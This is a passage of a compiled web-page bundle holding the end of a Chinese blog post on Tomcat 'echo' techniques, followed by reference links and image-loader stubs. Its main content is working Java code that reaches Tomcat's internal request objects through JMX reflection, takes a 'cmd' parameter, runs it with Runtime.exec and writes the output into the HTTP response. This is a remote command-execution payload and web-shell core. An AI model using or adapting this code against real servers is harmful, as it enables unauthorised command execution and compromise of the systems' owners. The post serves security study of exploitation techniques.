4e0a\u9762\u7684\u8981\u7b80\u5355\u4e00\u4e9b\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u81ea\u5df1\u591a\u5199\u5199"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'try {\n            com.sun.jmx.mbeanserver.JmxMBeanServer jmxMBeanServer = (com.sun.jmx.mbeanserver.JmxMBeanServer) org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();\n            Field mbsInterceptor = com.sun.jmx.mbeanserver.JmxMBeanServer.class.getDeclaredField("mbsInterceptor");\n            mbsInterceptor.setAccessible(true);\n            com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (DefaultMBeanServerInterceptor) mbsInterceptor.get(jmxMBeanServer);\n\n            Field repository = defaultMBeanServerInterceptor.getClass().getDeclaredField("repository");\n            repository.setAccessible(true);\n            com.sun.jmx.mbeanserver.Repository repository1 = (Repository) repository.get(defaultMBeanServerInterceptor);\n\n            HashSet<com.sun.jmx.mbeanserver.NamedObject> hashSet = (HashSet<com.sun.jmx.mbeanserver.NamedObject>) repository1.query(new javax.management.ObjectName("*:type=GlobalRequestProcessor,name=\\"http*\\""), null);\n            for (com.sun.jmx.mbeanserver.NamedObject namedObject : hashSet ) {\n                Field object = namedObject.getClass().getDeclaredField("object");\n                object.setAccessible(true);\n                org.apache.tomcat.util.modeler.BaseModelMBean baseModelMBean = (BaseModelMBean) object.get(namedObject);\n\n                Field resource = baseModelMBean.getClass().getDeclaredField("resource");\n                resource.setAccessible(true);\n                org.apache.coyote.RequestGroupInfo requestGroupInfo = (RequestGroupInfo) resource.get(baseModelMBean);\n\n                Field processors = requestGroupInfo.getClass().getDeclaredField("processors");\n                processors.setAccessible(true);\n                ArrayList<org.apache.coyote.RequestInfo> processors1 = (ArrayList) processors.get(requestGroupInfo);\n\n                // \u83b7\u53d6response\u4fee\u6539\u6570\u636e\n                // \u4e0b\u9762\u5faa\u73af\uff0c\u53ef\u4ee5\u5728\u8fd9\u5148\u83b7\u53d6req\u5b9e\u4f8b\uff0c\u907f\u514d\u6bcf\u6b21\u5faa\u73af\u90fd\u53cd\u5c04\u83b7\u53d6\u4e00\u6b21\n                Field req = RequestInfo.class.getDeclaredField("req");\n                req.setAccessible(true);\n                for (org.apache.coyote.RequestInfo requestInfo : processors1) {\n                    org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);\n                    // \u8f6c\u6362\u4e3a org.apache.catalina.connector.Request \u7c7b\u578b\n                    org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);\n                    org.apache.catalina.connector.Response response1 = request2.getResponse();\n\n                    // \u83b7\u53d6\u53c2\u6570\n                    PrintWriter writer = response1.getWriter();\n                    String cmd = request2.getParameter("cmd");\n                    if (cmd != null) {\n                        Process exec = Runtime.getRuntime().exec(cmd);\n                        InputStream inputStream = exec.getInputStream();\n                        DataInputStream dataInputStream = new DataInputStream(inputStream);\n                        String disr = dataInputStream.readLine();\n                        while (disr != null) {\n                            writer.write(disr);\n                            disr = dataInputStream.readLine();\n                        }\n                    }\n                    writer.flush();\n                }\n            }\n\n\n        } catch (NoSuchFieldException | IllegalAccessException | MalformedObjectNameException e) {\n            e.printStackTrace();\n        }\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u6548\u679c\uff1a"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220210161315396",src:r(41678).A+"",width:"1066",height:"130"})}),"\n",(0,t.jsx)(n.h2,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"\u6700\u540e\u4ee3\u7801\u5b9e\u73b0\u8fc7\u7a0b\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\uff0c\u4e3b\u8981\u8fd8\u662f\u5206\u6790\u8fc7\u7a0b\u627e\u5230\u4e00\u6761\u53ef\u5229\u7528\u7684\u94fe"}),"\n",(0,t.jsxs)(n.li,{children:["\u5e73\u65f6\u6211\u4eec\u8981\u62ff\u5230\u4e00\u4e2a\u5185\u5b58\u4e2d\u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u4e3b\u8981\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a","\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"\u53cd\u5c04"}),"\n",(0,t.jsx)(n.li,{children:"\u5411\u4e0a\u56de\u6eaf\u5206\u6790\uff0c\u5e94\u7528\u662f\u600e\u4e48\u521d\u59cb\u5316\u8fd9\u4e2a\u5b9e\u4f8b\u7684\uff0c\u627e\u5173\u8054\u51fd\u6570\u3001\u7c7b\u3001\u7c7b\u53d8\u91cf\u7b49\uff0c\u518d\u5f97\u5230\u8fd9\u4e2a\u5b9e\u4f8b"}),"\n"]}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\u5411\u4e0a\u4e00\u76f4\u56de\u6eaf\u5230\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e9b\u65b9\u6cd5\u83b7\u53d6\u5230\u5185\u5b58\u4e2d\u7684\u5b9e\u4f8b\u4e3a\u6b62\uff0c\u5982",(0,t.jsx)(n.code,{children:"Registry.getRegistry(null, null).getMBeanServer()"}),"\uff0c\u76f8\u5f53\u4e8e\u627e\u5230\u6574\u6761\u94fe\u7684\u5934"]}),"\n",(0,t.jsx)(n.li,{children:"\u7f16\u5199\u4ee3\u7801\u8fc7\u7a0b\u4e2d\u4e0d\u77e5\u9053\u8fd4\u56de\u7684\u5bf9\u8c61\u662f\u54ea\u4e00\u4e2a\u7c7b\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7debug\u8c03\u8bd5\u770b\u5230\uff0c\u7136\u540e\u518d\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362"}),"\n"]}),"\n",(0,t.jsx)(n.admonition,{type:"warning",children:(0,t.jsx)(n.p,{children:"\u5982\u6709\u9519\u8bef\uff0c\u656c\u8bf7\u6307\u6b63"})}),"\n",(0,t.jsx)(n.h2,{id:"\u53c2\u8003",children:"\u53c2\u8003"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.a,{href:"https://lucifaer.com/2020/05/12/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/",children:"Tomcat\u901a\u7528\u56de\u663e\u5b66\u4e60"})}),"\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.a,{href:"https://www.anquanke.com/post/id/264821",children:"Tomcat\u56de\u663e\u6280\u672f\u5b66\u4e60\u6c47\u603b"})}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},30614:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209145324208-e825117e7e9fc2ee359b7a8c0a6abaff.png"},32334:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209141702349-46e5f07ef42bd4948241933784e0200d.png"},33865:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209131918395-e87506fb81f8c5134b66100f19aee152.png"},34952:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209132008687-cc35dae4bd543c78f0a0012d549154d2.png"},39376:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209144852773-ec8b81d56ebd5b3a2143c3dea8a8c8ce.png"},41678:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220210161315396-5f4fb04595d43162bbff599d3dcd7217.png"},43023:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209155231759-ab4bc1920ffc606d5190a1fbc59bf0c9.png"},43780:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209131527653-03fa915fbc405d5d89625edef506f541.png"},55030:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209120802123-7749c3c5020cc7217c3cf1669aaca0fb.png"},60299:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209165207236-782010fa41984ab5704433d80047df7e.png"},60711:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209135506259-e4bce62912a5e7782491c8470917c9ee.png"},62189:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209140736739-0b536c99cc3e845fc1c851dbd2453f39.png"},62531:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209131235762-bdb01a7d4174c4b9168f0c9012fca34e.png"},63133:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220210124548884-f1ccb5c3773ae38cf34af8d8fb84beeb.png"},66323:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209173933442-81be727189980cf9c947ead2b2ae903a.png"},73474:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209140508186-c0a2e2114d5d04e01665e35bf483b7d9.png"},74419:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209141048057-03a4c95cbb61949248e4d8780c08bf99.png"},80003:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220210124145698-6176ef142b87c09aeddd0a029f837a78.png"},84138:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209173721349-7d957d0ec2edb53f0b8b4bedfdc28969.png"},86868:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209145459900-722d7af2c06884795d47cd0ad2eed095.png"},89760:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209121444953-bdbe20c33f639305000e6c3bcfc117c2.png"},91947:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209152439431-139a29c0d40c55665560e74f56650bdb.png"},93935:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220210094109672-6dfd60007ab0d67d9c7b9822e0468ed7.png"},99597:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209142613612-755f6339bffbe07b1ad25b85e046c634.png"}}]);